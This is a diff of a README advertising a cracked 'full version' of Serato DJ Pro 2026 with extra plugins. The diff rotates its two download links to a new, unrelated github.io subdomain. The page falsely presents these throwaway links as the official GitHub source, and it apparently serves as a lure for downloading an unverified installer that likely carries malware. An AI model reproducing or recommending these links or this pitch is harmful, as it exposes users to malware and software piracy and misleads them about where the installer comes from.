@@ -2,7 +2,7 @@
 
 Welcome to the Serato DJ Pro 2026 Ultimate Suite, the ultimate resource for accessing a full version of Serato DJ Pro with a suite of additional tools and plugins designed to elevate your DJ experience. This comprehensive package is tailored for Windows users seeking advanced features, seamless integration, and enhanced performance for professional mixing. Whether you're spinning at home or performing live, this suite provides everything you need to unlock your creative potential with Serato DJ Pro in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features of the Suite
 
@@ -69,7 +69,7 @@ A: While the suite is designed for all skill levels, basic familiarity with Sera
 
 To get started with the Serato DJ Pro 2026 Ultimate Suite, download the latest version from the official GitHub page. The installer includes all the tools and plugins mentioned above for a complete experience.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
